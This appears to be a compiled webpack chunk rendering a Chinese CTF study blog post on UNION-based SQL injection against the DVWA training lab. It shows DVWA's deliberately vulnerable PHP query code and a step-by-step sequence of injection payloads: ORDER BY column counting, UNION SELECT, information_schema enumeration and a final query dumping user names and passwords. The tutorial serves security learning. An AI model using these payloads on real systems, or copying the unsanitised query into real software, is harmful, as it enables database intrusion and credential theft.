(window.webpackJsonp=window.webpackJsonp||[]).push([[160],{701:function(s,a,t){"use strict";t.r(a);var n=t(2),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("Boxx"),s._v(" "),a("p",[s._v("从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第26天")]),s._v(" "),a("p"),a("div",{staticClass:"table-of-contents"},[a("ul",[a("li",[a("a",{attrs:{href:"#示例"}},[s._v("示例")])]),a("li",[a("a",{attrs:{href:"#示例的漏洞"}},[s._v("示例的漏洞")])]),a("li",[a("a",{attrs:{href:"#如何利用示例的漏洞"}},[s._v("如何利用示例的漏洞")])]),a("li",[a("a",{attrs:{href:"#总结"}},[s._v("总结")])])])]),a("p"),s._v(" "),a("ul",[a("li",[s._v("视频地址【"),a("a",{attrs:{href:"https://www.bilibili.com/video/BV1Lh411F7s8/",target:"_blank",rel:"noopener noreferrer"}},[s._v("传送门"),a("OutboundLink")],1),s._v("】")])]),s._v(" "),a("h1",{attrs:{id:"第8章-联合查询注入的作用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#第8章-联合查询注入的作用"}},[s._v("#")]),s._v(" 第8章：联合查询注入的作用")]),s._v(" "),a("h2",{attrs:{id:"示例"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#示例"}},[s._v("#")]),s._v(" 示例")]),s._v(" "),a("p",[s._v("看一段有漏洞的代码")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("isset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'Submit'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// Get input 从用户请求中获取id参数")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$id")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'id'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// Check database 然后直接将id参数的值拼接进SQL语句，进行SQL查询")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$query")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v("\"SELECT first_name, last_name FROM users WHERE user_id = '"),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$id")])]),s._v("';\"")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$result")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mysql_query")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$query")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("or")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("die")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'<pre>'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mysql_error")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'</pre>'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// Get results")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$num")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mysql_numrows")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$result")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$i")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("while")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$i")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$num")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//Get values")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$first")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mysql_result")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$result")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$i")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"first_name"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$last")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mysql_result")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$result")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$i")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"last_name"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//Feedback for end user 最终输出查询结果")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"<pre>ID: '),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$id")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")])]),s._v("<br />FIrest name: "),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$first")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")])]),s._v("<br />Surname: "),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$last")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")])]),s._v('</pre>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//Increase loop count")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$i")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("++")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mysql_close")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br")])]),a("p",[s._v("以上是DVWA的SQL注入的靶场的源代码")]),s._v(" "),a("h2",{attrs:{id:"示例的漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#示例的漏洞"}},[s._v("#")]),s._v(" 示例的漏洞")]),s._v(" "),a("p",[s._v("代码在构建 SQL 查询语句时，直接将用户通过 "),a("code",[s._v("$_REQUEST['id']")]),s._v(" 输入的值拼接到了 SQL 语句中（"),a("code",[s._v("$query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\";")]),s._v("），没有做任何的输入验证、过滤或者转义处理。")]),s._v(" "),a("p",[s._v("SQL注入产生的条件是：Web程序要接受用户的输入，并且用户的输入不再是原本的那个参数，而是变成了SQL语句中合法的一部分。")]),s._v(" "),a("h2",{attrs:{id:"如何利用示例的漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#如何利用示例的漏洞"}},[s._v("#")]),s._v(" 如何利用示例的漏洞")]),s._v(" "),a("p",[s._v("1.正常查询情况下，我们输入1，此时的查询语句是")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '1';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("查询条件判断为真，返回user_id为1的用户数据；")]),s._v(" "),a("p",[s._v("2.我们尝试SQL注入，输入1‘ and '1' = '2 ，此时最终的查询SQL语句为：")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '1' and '1' = '2';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("此时查询条件判断为假，就查不到想要的内容。")]),s._v(" "),a("p",[s._v("3.我们把条件改一下，输入1‘ or '1234' = '1234 ，此时最终的查询SQL语句为：")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '1' or '1234' = '1234';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("查询条件判断恒为真，返回users表中所有用户数据。")]),s._v(" "),a("p",[s._v("4.我们再修改一下条件，这次不用字符型的注入，用数字型的注入，为了方便之后查询字段数")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '\n/*\n以下内容为我们传入的$id，先用一个单引号把前边的单引号闭合，然后order by 1 #，这里井号是要注释下一个单引号\n*/\n1' or 1 = 1 order by 1#\n';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("5.同理我们修改一下参数，让order by 1的数字继续往上加")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '\n/*\n以下内容为我们传入的$id，先用一个单引号把前边的单引号闭合，然后order by 2 #，这里井号是要注释下一个单引号\n*/\n1' or 1 = 1 order by 2#\n';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("当加到3的时候，也就是超过列的数量的时候，会报类似以下错误：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("Unknown column '3' in 'order clause'\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("这样就说明这张表只有两列")]),s._v(" "),a("p",[s._v("6.确认显示的字段的顺序，输入1' union select 1,2 # ，查询成功(用到了联合查询)")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,2 #';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("在使用union时，我们需要注意左右两端的字段数需要相同，如果我们两边字段数不同，会报以下错误")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("select * from users union select 1;\nERROR 1222(21000): The used SELECT statements have a different number of columns\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("7.以上已经完成了所有的前期准备，接下来我们正式获取数据库信息了")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '\n1' union select 1,database() #';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20241211201639259.png",alt:"image-20241211201639259"}})]),s._v(" "),a("p",[s._v("注：图仅供参考，可能有错漏")]),s._v(" "),a("p",[s._v("以上查询就可以找到数据库名")]),s._v(" "),a("p",[s._v("8.获取当前数据库的表名")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '\n# 以下是输入的内容\n1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20241211203322243.png",alt:"image-20241211203322243"}})]),s._v(" "),a("p",[s._v("注：图仅供参考，可能有错漏")]),s._v(" "),a("blockquote",[a("p",[s._v("需要了解：")]),s._v(" "),a("p",[a("strong",[s._v("group_concat()")]),s._v("，意思是把所有查出来的东西放到一起，一列的所有行结果都放到一起。这里最好是用上这个group_concat，有的时候题目环境会限制输出，比如我们查到了100行内容，但是只输出一行，这时候就用到了这个group_concat")]),s._v(" "),a("p",[a("strong",[s._v("information_schema.tables")]),s._v("，在MySQL中，information_schema看作是一个信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名称、数据库的表，表栏的数据类型与访问权限等。在INFORMATION_SCHEMA中，有数个只读表，他们实际上是视图，而不是基本表。因此无法看到与之相关的任何文件。")]),s._v(" "),a("ol",[a("li",[s._v("SCHEMATA表：提供了当前mysql实例中所有数据库的信息，是show databases的结果取之于此表")]),s._v(" "),a("li",[s._v("TABLES表：提供了关于数据库中表的信息（包括视图），详细标书了某个表属于哪个schema，表类型，表引擎，创建时间等。是show tables from schemaname的结果就取之于此表")]),s._v(" "),a("li",[s._v("COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息，是show columns from schemaname.tablename的结果取之于此表。")])])]),s._v(" "),a("p",[s._v("9.获取表中的字段名")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '\n# 以下是输入的内容\n1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/img/ctfLearnimage-20241211205111554.png",alt:"image-20241211205111554"}})]),s._v(" "),a("p",[s._v("注：图仅供参考，可能有错漏")]),s._v(" "),a("p",[s._v("10.此外，还要考虑如果题目环境如果做了限制，查询到了100条，只显示一条这种情况")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '\n# 以下是输入的内容\n1' and 1=2\nunion select 1,group_concat(column_name) from information_schema.columns where table_name='users' #';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("只要让union左边的表没有东西，就会直接显示右边的表的第一行内容")]),s._v(" "),a("p",[a("img",{attrs:{src:"/img/ctfLearnimage-20241211205217160.png",alt:"image-20241211205217160"}})]),s._v(" "),a("p",[s._v("注：图仅供参考，可能有错漏")]),s._v(" "),a("p",[s._v("11.如果不让用group_concat函数怎么办？我们可以用limit 0 ,1(从第0行开始，输出1条内容)")]),s._v(" "),a("div",{staticClass:"language-mysql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '\n# 以下是输入的内容\n1' and 1=2\nunion select 1,group_concat(column_name) from information_schema.columns where table_name='users'\nlimit 0,1\n#';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[a("img",{attrs:{src:"/img/ctfLearn/image-20241211205514443.png",alt:"image-20241211205514443"}})]),s._v(" "),a("p",[s._v("注：图仅供参考，可能有错漏")]),s._v(" "),a("p",[s._v("12.获取数据")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '\n# 以下是输入的内容\n1' or 1=1\nunion select group_concat(user_id,first_name,last_name),group_concat(password) from users\n#';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"总结"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[s._v("#")]),s._v(" 总结")]),s._v(" "),a("p",[s._v("联合查询常用套路和步骤：")]),s._v(" "),a("ol",[a("li",[s._v("order by 猜列数")]),s._v(" "),a("li",[s._v("union select 跟列数找到回显点，对应的地方放查询语句")])]),s._v(" "),a("p",[s._v("例：得知有3列，可以union select 233,666,777找到页面中回显的地方，比如233被回显到了页面中，泽可以union select database(),666,777即可得到数据库名。")])],1)}),[],!1,null,null,null);a.default=e.exports}}]);